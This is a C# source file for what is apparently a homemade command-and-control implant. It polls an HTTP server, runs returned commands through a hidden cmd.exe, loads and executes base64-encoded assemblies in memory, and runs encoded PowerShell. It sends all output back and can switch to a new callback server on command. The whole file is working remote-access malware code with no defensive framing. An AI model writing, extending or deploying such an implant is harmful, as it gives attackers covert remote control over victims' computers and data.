#pragma warning disable 4014 //I don't need to wait for response
using System.Diagnostics;
using System.Reflection;

string responseBody;
int sleep = 2000;
string server = "http://127.0.0.1:5000";

//dictonary of two type
Dictionary<string, Assembly> loadedasms = new Dictionary<string, Assembly>();

void assemblyload(string payload, string nametosaveitas) {
    try {
        byte[] bytearray = Convert.FromBase64String(payload);
        Assembly asm = Assembly.Load(bytearray);
        loadedasms.Add(nametosaveitas, asm);
        sendmessagetoserver(nametosaveitas + " loaded");
    } catch (Exception e) {
        sendmessagetoserver(e.ToString());
    }
    return;
}
void assemblyrun(string name) {
    try {
        if (!loadedasms.ContainsKey(name)) {
            sendmessagetoserver(name + " assembly not loaded");
            return;
        }
        Assembly asm = loadedasms[name];
        var method = asm.EntryPoint;
        if (method == null) {
            sendmessagetoserver("Was unable to find entrypoint");
            return;
        }
        var returnvalue = method.Invoke(null, new object[] {new string[] { } });
        #pragma warning disable 8602
        #pragma warning disable 8604
        sendmessagetoserver(returnvalue.ToString()); //can be null, if so just let expection handler tell the user
        #pragma warning restore 8604
        #pragma warning restore 8602
    } catch (Exception e) {
        sendmessagetoserver(e.ToString());
    }
    return;
}

void runpowershellscript(string[] arguments) {
    string script = arguments[1];
    string therestofarguments = "";
    for (var i = 2; i < arguments.Length; i++) {
        therestofarguments += " " + arguments[i];
    }
        
    
    byte[] bytearray = Convert.FromBase64String(script);
    var command = System.Text.Encoding.UTF8.GetString(bytearray, 0, bytearray.Length);
    using (System.Management.Automation.PowerShell ps = System.Management.Automation.PowerShell.Create()) {
        ps.AddScript(command + therestofarguments);
        ps.AddCommand("Out-String"); //so we get a nice string rather than a bunch of objects
        var results = ps.Invoke();
        
        string returnvalue = "";
        foreach (var result in results) {
            returnvalue += result.ToString() + "\n";
        }
        sendmessagetoserver(returnvalue);
    }

}

//built in command handler function
bool handlecommands(string command) {
    string[] splits = command.Split(" ");
    if (splits[0] == "sleep") {
        sleep = Convert.ToInt16(splits[1]) * 1000;
        return true;
    }
    if (splits[0] == "changeserver") {
        server = splits[1]; //don't mess up though or you'll never get a callback
        return true;
    }
    if (splits[0] == "load") {
        assemblyload(splits[1], splits[2]);
        return true;
    }
    if (splits[0] == "run") {
        assemblyrun(splits[1]);
        return true;
    }
    if (splits[0] == "runps") {
        runpowershellscript(splits);
        return true;
    }

    return false;
}

HttpClient client = new HttpClient();

async Task<bool> sendmessagetoserver(string message) {
    try {
        StringContent postdata = new StringContent(message);
        var response = await client.PostAsync(server + "/response", postdata);
        //var responseBody = await response.Content.ReadAsStringAsync();
        //Console.WriteLine(responseBody); //print the response for sanity checking
        return true;
    } catch (Exception e) {
        Console.WriteLine("Hope it wasn't an important message \n" + e.ToString());
        return false;
    }
}

while (true) {
try {
    Thread.Sleep(sleep);
    HttpResponseMessage response = await client.GetAsync(server + "/checkin");
    if (response.StatusCode != System.Net.HttpStatusCode.OK) {
        continue;
    }
    //response.EnsureSuccessStatusCode();
    responseBody = await response.Content.ReadAsStringAsync();
    if (handlecommands(responseBody)) {
        continue;
    }
    //spawn a new cmd process
    Process start = new Process();
    start.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
    //and pass the response as an argument
    start.StartInfo.Arguments = "/c " + responseBody;
    start.StartInfo.UseShellExecute = false;
    start.StartInfo.CreateNoWindow = true;
    start.StartInfo.RedirectStandardOutput = true; //so we can read the output
    start.Start();
    //read the output
    string data = start.StandardOutput.ReadToEnd();
    //convert the output to a string and send it back to the server
    await sendmessagetoserver(data);
} catch (Exception e) {
    await sendmessagetoserver(e.ToString());
}
}